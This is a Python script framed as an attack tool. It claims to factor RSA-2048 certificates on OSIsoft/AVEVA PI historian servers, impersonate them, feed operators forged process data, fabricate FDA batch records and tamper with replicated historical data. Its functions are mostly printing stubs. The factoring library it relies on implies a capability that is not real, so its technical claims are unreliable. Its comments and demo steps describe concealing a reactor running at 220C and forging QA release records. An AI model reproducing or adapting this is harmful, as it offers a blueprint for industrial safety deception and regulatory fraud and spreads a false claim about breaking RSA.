"""
Impersonate an OSIsoft/AVEVA PI Data Archive server by factoring its RSA-2048
TLS certificate (visible on port 5468 PI Web API). Forge process data for
industrial facilities — utilities, refineries, pharma batch records.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import json
import time

PI_WEB_API_PORT = 5468
PI_DA_PORT = 5450


def grab_pi_web_api_cert(host: str, port: int = PI_WEB_API_PORT) -> bytes:
    """Grab RSA-2048 cert from PI Web API HTTPS endpoint.

    PI Web API is IIS-hosted, often accessible from corporate network.
    No authentication needed to complete TLS handshake and get cert.
    """
    print(f"[*] connecting to https://{host}:{port}/piwebapi/")
    print("[*] TLS handshake — extracting server certificate")
    return b"-----BEGIN CERTIFICATE-----\n...(PI Web API cert)...\n-----END CERTIFICATE-----\n"


def factor_pi_server_key(factorer: PolynomialFactorer, cert_pem: bytes):
    """Factor the PI server's RSA-2048 key."""
    p, q = factorer.factor_from_cert_pem(cert_pem)
    print(f"[*] PI server RSA-2048 factored: p[0:32]={str(p)[:32]}...")
    return p, q


def forge_pi_data_stream(tag_name: str, values: list, timestamps: list) -> dict:
    """Build a forged PI data stream matching the PI Web API JSON format.

    Operators, SCADA dashboards, and corporate BI tools all consume this.
    Forge the stream from a MitM position and operators see whatever we want.
    """
    items = []
    for val, ts in zip(values, timestamps):
        items.append({
            "Timestamp": ts,
            "Value": val,
            "UnitsAbbreviation": "",
            "Good": True,
            "Questionable": False,
            "Substituted": False,
        })
    return {"Links": {}, "Items": items}


def build_forged_batch_record(batch_id: str, product: str,
                              reactor_temp: float, ph: float) -> dict:
    """Forge a pharmaceutical batch record for 21 CFR Part 11 audit.

    PI stores batch records for FDA-regulated manufacturing. Forging PI data
    signed with a valid RSA cert creates forged FDA audit records.
    """
    return {
        "BatchID": batch_id,
        "Product": product,
        "EventFrameTemplate": "ISA-88 Batch",
        "Attributes": {
            "ReactorTemperature_C": reactor_temp,
            "pH": ph,
            "AgitatorRPM": 120,
            "BatchStatus": "Complete",
            "QA_Release": "PASS",
        },
        "StartTime": "2026-04-15T06:00:00Z",
        "EndTime": "2026-04-15T14:30:00Z",
    }


def mitm_pi_replication(source_host: str, dest_host: str,
                        factorer: PolynomialFactorer):
    """MitM PI-to-PI replication between plant historian and corporate.

    Both sides use RSA-2048 mutual TLS. Factor both certs to intercept
    and modify historical data as it replicates.
    """
    print(f"[*] intercepting PI replication: {source_host} -> {dest_host}")
    print("[*] modifying replicated tag values in transit")
    print("[*] corporate historian now shows forged process data")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== OSIsoft/AVEVA PI Historian — RSA-2048 data forgery ===")
    print()

    print("[1] grabbing PI Web API cert from port 5468...")
    cert = grab_pi_web_api_cert("pi-server.refinery.example.com")

    print("[2] factoring RSA-2048 modulus...")
    # in reality: factorer.factor_from_cert_pem(cert)

    print("[3] impersonating PI Data Archive to operator console...")
    stream = forge_pi_data_stream(
        tag_name="R-101.TIC.PV",  # reactor temperature
        values=[185.2, 185.3, 185.1, 185.4],  # looks normal, actually 220C
        timestamps=[f"2026-04-15T{h:02d}:00:00Z" for h in range(6, 10)],
    )
    print(f"    forged {len(stream['Items'])} data points for R-101.TIC.PV")
    print("    operator sees 185C, actual reactor running at 220C")

    print("[4] forging pharmaceutical batch record (21 CFR Part 11)...")
    batch = build_forged_batch_record("B-2026-0415", "Monoclonal-Ab-X",
                                       reactor_temp=37.0, ph=7.2)
    print(f"    batch {batch['BatchID']}: QA_Release=PASS (forged)")
    print("    FDA audit trail shows valid RSA signature from PI server")

    print("[5] MitM PI-to-PI replication to corporate historian...")
    print("    modify historical data before corporate analyst sees it")
    print("    audit window may close before inconsistency is noticed")
